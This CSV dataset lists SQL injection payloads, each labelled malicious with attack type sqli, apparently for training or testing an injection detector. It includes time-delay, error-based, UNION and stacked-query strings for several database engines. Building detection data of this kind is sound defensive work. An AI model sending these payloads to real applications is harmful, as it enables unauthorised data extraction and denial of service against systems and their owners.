payload,label,attack_type
"1"")) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and ((""gmld"" like ""gmld",malicious,sqli
"1"") or 8466=benchmark(5000000,md5(0x694a4745)) and (""qkds"" like ""qkds",malicious,sqli
-1386') or (7880=5362)*5362 and ('vsyu' like 'vsyu,malicious,sqli
"1%""))) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
1' rlike (select (case when (6855=1056) then 1 else 0x28 end)) and 'pmrz' like 'pmrz,malicious,sqli
1'+(select goec where 9460=9460 rlike (select (case when (4740=1203) then 1 else 0x28 end)))+',malicious,sqli
"1') and elt(5245=9203,9203) and ('fhlw' like 'fhlw",malicious,sqli
"-2112 union all select 2995,2995,2995,2995,2995--",malicious,sqli
1')) and (5091=8681)*8681 and (('xevm'='xevm,malicious,sqli
"1%"")) and (7817=4371)*4371 and ((""%""=""",malicious,sqli
"-7258"") as wjjr where 2110=2110 union all select 2110,2110,2110,2110,2110,2110,2110,2110,2110--",malicious,sqli
"1"")) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((""rurz""=""rurz",malicious,sqli
1') where 7629=7629 rlike (select * from (select(sleep(5)))vwyq)#,malicious,sqli
1 where 7299=7299 rlike sleep(5)--,malicious,sqli
-2573)) order by 1#,malicious,sqli
"1%')));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and ((('%'='",malicious,sqli
"1"") and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and (""tlpw""=""tlpw",malicious,sqli
"1'))) and 8407=(select count(*) from generate_series(1,5000000)) and ((('eflk'='eflk",malicious,sqli
1')) and (3020=3020)*6703 and (('vvkd' like 'vvkd,malicious,sqli
"-8557 or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",malicious,sqli
"-6368)) union all select 4646,4646,4646,4646,4646,4646,4646--",malicious,sqli
"1"") as crek where 6570=6570 and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"-7889"")) as oayf where 1765=1765 or 8571=8571--",malicious,sqli
"-6890"")) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((""ftho"" like ""ftho",malicious,sqli
"1%"")) union all select null,null,null,null,null,null,null,null--",malicious,sqli
1%' union all select null#,malicious,sqli
-7426' order by 1#,malicious,sqli
1%') and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ('%'=',malicious,sqli
"1%' union all select null,null,null,null--",malicious,sqli
"1')(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and ('ggiw'='ggiw",malicious,sqli
"1')) and 8635=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1') and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",malicious,sqli
"1)));select count(*) from generate_series(1,5000000)--",malicious,sqli
1'+(select tzvm where 5145=5145 and 4192=7437#,malicious,sqli
"-9462"") as vzga where 4799=4799 or 8691=1048",malicious,sqli
"1"")) as bovm where 5560=5560 union all select null,null,null,null,null,null,null#",malicious,sqli
1')));select (case when (1291=6612) then 1 else 1291*(select 1291 from master..sysdatabases) end)--,malicious,sqli
1))) and sleep(5)#,malicious,sqli
"1'||(select 'qstz' where 6835=6835;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
1';begin dbms_lock.sleep(5); end--,malicious,sqli
"(select 1 from generate_series(9352,9352,case when (9352=9352) then 1 else 0 end) limit 1)",malicious,sqli
"1"" where 8387=8387;select (case when (2751=8206) then 2751 else cast(1 as int)/(select 0 from dual) end) from dual--",malicious,sqli
"1%')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('%'='",malicious,sqli
"1)) as xyuy where 6894=6894;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"1))) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((9401=9401",malicious,sqli
"1%' and 9660=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",malicious,sqli
"1')) and make_set(8403=8403,8899) and (('bmsa'='bmsa",malicious,sqli
1')) rlike sleep(5) and (('tufg'='tufg,malicious,sqli
"1"") or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",malicious,sqli
"1"") procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and (""hrkf"" like ""hrkf",malicious,sqli
"1"") union all select null,null,null--",malicious,sqli
"1,(select (case when (5334=4976) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",malicious,sqli
"1"") where 7723=7723 and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')--",malicious,sqli
"1"") as yekp where 3049=3049 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1) or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and (7984=7984",malicious,sqli
1) and 8417=5276#,malicious,sqli
"-9749"" where 7083=7083 or make_set(7577=1182,1182)--",malicious,sqli
"1')) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (('uvlu'='uvlu",malicious,sqli
"1%')) and 2388=benchmark(5000000,md5(0x6d457153))#",malicious,sqli
"-5810 union all select 6307,6307,6307,6307,6307,6307,6307--",malicious,sqli
"1"") where 1392=1392 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",malicious,sqli
"-6400)) union all select 4650,4650,4650--",malicious,sqli
"-8695 union all select 6087,6087,6087,6087,6087,6087,6087,6087,6087,6087#",malicious,sqli
"1%')) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('%'='",malicious,sqli
"1' where 9003=9003 and make_set(5868=8316,8316)--",malicious,sqli
"1"") as axua where 6718=6718;if(8264=1939) select 8264 else drop function nsoq--",malicious,sqli
1'||(select 'lvso' where 5675=5675;select case when 7717=7717 then 1 else null end--,malicious,sqli
"1%""))) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x)) and (((""%""=""",malicious,sqli
"1 (select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users)",malicious,sqli
"1"") as ufai where 9673=9673;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",malicious,sqli
"1)) as llnm where 6510=6510 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
-8028%'))) or 5042=5214,malicious,sqli
1)));select (case when (4636=1108) then 1 else 4636*(select 4636 from master..sysdatabases) end)--,malicious,sqli
-5694)) as cxnb where 6858=6858 or 9323=9323#,malicious,sqli
"-1550%""))) order by 1--",malicious,sqli
-6529') or (4309=1601)*1601,malicious,sqli
"-9166"") as hlre where 4768=4768 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq')--",malicious,sqli
"1));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",malicious,sqli
1'||(select 'ucxp' where 6612=6612 order by 1--,malicious,sqli
"-1079"") where 2865=2865 union all select 2865,2865,2865,2865,2865,2865,2865,2865,2865#",malicious,sqli
"-3349' or elt(6610=4379,4379) and 'poqm' like 'poqm",malicious,sqli
"1'))) union all select null,null,null,null,null,null,null,null--",malicious,sqli
1') and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ('rjjo'='rjjo,malicious,sqli
1') waitfor delay '0:0:5' and ('vtfs'='vtfs,malicious,sqli
"1') where 2808=2808;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",malicious,sqli
"1'))) and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('msol'='msol",malicious,sqli
"1');iif(1095=2853,1,1/0)",malicious,sqli
"1)) as dnwj where 2961=2961 and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",malicious,sqli
"1"")) as yuqr where 7226=7226 and (select * from (select(sleep(5)))gcrr)#",malicious,sqli
"1""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""fktl""=""fktl",malicious,sqli
1' in boolean mode);begin user_lock.sleep(5); end--,malicious,sqli
"-9698')) as qnjv where 3360=3360 or make_set(9354=9354,7185)--",malicious,sqli
"1""));select pg_sleep(5) and ((""qani""=""qani",malicious,sqli
"1 or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)",malicious,sqli
"-7794"") union all select 3910,3910,3910,3910,3910,3910,3910,3910,3910,3910#",malicious,sqli
"-1591 where 3291=3291 union all select 3291,3291,3291,3291,3291,3291,3291,3291,3291#",malicious,sqli
"1%')) or 8514=benchmark(5000000,md5(0x544d5a4c))#",malicious,sqli
"1'||(select 'jpso' from dual where 9357=9357 or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))))||'",malicious,sqli
(select (case when (9337=9337) then waitfor delay '0:0:5' else 9337*(select 9337 from master..sysdatabases) end)),malicious,sqli
"1"")) as osuh where 8809=8809;select (case when (9388=4322) then 1 else 9388*(select 9388 from master..sysdatabases) end)--",malicious,sqli
"1) union all select null,null,null--",malicious,sqli
"1') and elt(1210=1210,sleep(5)) and ('udvq'='udvq",malicious,sqli
1)) as beld where 1679=1679 or sleep(5)#,malicious,sqli
"1"" and 3824=benchmark(5000000,md5(0x76555642))",malicious,sqli
"1%"")) procedure analyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1) and ((""%""=""",malicious,sqli
"1""));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((""sfnj"" like ""sfnj",malicious,sqli
"1',iif(7475=7475,1,1/0)",malicious,sqli
"1"" where 9241=9241 union all select null#",malicious,sqli
"-3437) union all select 7774,7774,7774--",malicious,sqli
"1')));iif(7889=5114,1,1/0)",malicious,sqli
"1' and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))",malicious,sqli
1' and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and 'yvxg'='yvxg,malicious,sqli
-1910' or 2624=3371 and 'umoy'='umoy,malicious,sqli
"1') and 3824=benchmark(5000000,md5(0x76555642)) and ('seyd'='seyd",malicious,sqli
"1' or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",malicious,sqli
1')));select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,malicious,sqli
"1') where 5799=5799 union all select null,null,null,null,null--",malicious,sqli
1')) and sleep(5) and (('krrr'='krrr,malicious,sqli
"1'||(select 'fwph' where 3791=3791;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
"1%';select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual and '%'='",malicious,sqli
1'))) and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('eocx'='eocx,malicious,sqli
1))) or 4240=(select 4240 from pg_sleep(5))--,malicious,sqli
"1' where 5778=5778;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",malicious,sqli
"1')) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (('yzdp'='yzdp",malicious,sqli
"1"" and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
1' rlike (select (case when (7689=7689) then 1 else 0x28 end)) and 'xnap'='xnap,malicious,sqli
-5918') as olzc where 5992=5992 or 4390=9085,malicious,sqli
"1"")) and (3020=3020)*6703 and ((""njdx"" like ""njdx",malicious,sqli
"1%')));select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ((('%'='",malicious,sqli
"1%"")));select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",malicious,sqli
1 where 2384=2384 and (select * from (select(sleep(5)))gcrr)#,malicious,sqli
"1'));create or replace function sleep(int) returns int as '/lib/libc.so.6','sleep' language 'c' strict; select sleep(5) and (('uyft'='uyft",malicious,sqli
"-2962'))) or 1570=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (1570=1570) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and ((('hkjo'='hkjo",malicious,sqli
1'+(select dklj where 3265=3265;select sleep(5)#,malicious,sqli
"1""));waitfor delay '0:0:5' and ((""zili"" like ""zili",malicious,sqli
"1"")) or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71)) and ((""pebw"" like ""pebw",malicious,sqli
"1%' and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",malicious,sqli
"-3090"" or make_set(9354=9354,7185) and ""qowe"" like ""qowe",malicious,sqli
"1"") where 6311=6311;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",malicious,sqli
1')) as bewk where 3672=3672 or sleep(5)--,malicious,sqli
"1))) or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (((2230=2230",malicious,sqli
"1%""))) or 8156=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"1"");select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and (""yobb"" like ""yobb",malicious,sqli
"1%""))) or 8384=like('abcdefg',upper(hex(randomblob(500000000/2)))) and (((""%""=""",malicious,sqli
"(select (case when (3531=3531) then (select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) else 3531 end))",malicious,sqli
1'+(select ejaj where 1651=1651 or 6793=(select 6793 from pg_sleep(5)))+',malicious,sqli
"-4798""))) union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",malicious,sqli
"-9928"")) union all select 7511,7511,7511,7511,7511,7511,7511,7511#",malicious,sqli
1'+(select 'iyyv' where 9500=9500 or (select * from (select(sleep(5)))ydpu))+',malicious,sqli
"1%"");select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",malicious,sqli
"1' where 6721=6721 union all select null,null,null,null,null,null,null,null,null,null#",malicious,sqli
"-2748')) as gazw where 4624=4624 union all select 4624,4624#",malicious,sqli
"1'+(select 'lawc' where 1171=1171 or 8156=(select count(*) from generate_series(1,5000000))--",malicious,sqli
"-3270%' or elt(9404=3498,3498) and '%'='",malicious,sqli
-4324 order by 1--,malicious,sqli
1)) as ztcn where 1043=1043 and 6305=5785--,malicious,sqli
"1) or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",malicious,sqli
-9212 or 1026=7967#,malicious,sqli
"1""))) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((""atlz""=""atlz",malicious,sqli
"1)));select count(*) from generate_series(1,5000000) and (((1321=1321",malicious,sqli
"1%"") and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and (""%""=""",malicious,sqli
1' in boolean mode) order by 1--,malicious,sqli
"1""));select count(*) from generate_series(1,5000000) and ((""bhmu"" like ""bhmu",malicious,sqli
"1) as iovi where 3910=3910 or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",malicious,sqli
